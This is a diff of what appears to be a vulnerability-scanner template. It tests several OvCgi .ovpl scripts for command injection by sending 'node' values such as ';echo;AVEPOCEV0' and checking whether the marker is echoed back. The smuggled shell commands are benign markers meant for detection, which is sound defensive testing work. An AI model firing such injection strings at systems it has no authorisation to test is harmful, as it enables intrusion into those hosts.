@@ -18,7 +18,7 @@ path = "/OvCgi/connectedNodes.ovpl"
 Host = "{{Hostname}}"
 
 [poc.requests.query]
-node = "|echo AVEPOCEV0"
+node = ";echo;AVEPOCEV0"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -33,13 +33,13 @@ expect = true
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/cdpView.ovpl"
+path = "/OvCgi/connectedNodes.ovpl"
 
 [poc.requests.headers]
 Host = "{{Hostname}}"
 
 [poc.requests.query]
-node = "|echo AVEPOCEV1"
+node = "|echo;AVEPOCEV1|"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -54,13 +54,13 @@ expect = true
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/freeIPaddrs.ovpl"
+path = "/OvCgi/cdpView.ovpl"
 
 [poc.requests.headers]
 Host = "{{Hostname}}"
 
 [poc.requests.query]
-node = "|echo AVEPOCEV2"
+node = ";echo;AVEPOCEV2"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -75,13 +75,13 @@ expect = true
 
 [[poc.requests]]
 method = "GET"
-path = "/OvCgi/ecscmg.ovpl"
+path = "/OvCgi/freeIPaddrs.ovpl"
 
 [poc.requests.headers]
 Host = "{{Hostname}}"
 
 [poc.requests.query]
-node = "|echo AVEPOCEV3"
+node = ";echo;AVEPOCEV3"
 
 [[poc.requests.matchers]]
 type = "status"
@@ -92,4 +92,25 @@ expect = true
 type = "word"
 part = "body"
 words = ["AVEPOCEV3"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/OvCgi/ecscmg.ovpl"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+
+[poc.requests.query]
+node = ";echo;AVEPOCEV4"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["AVEPOCEV4"]
 expect = true
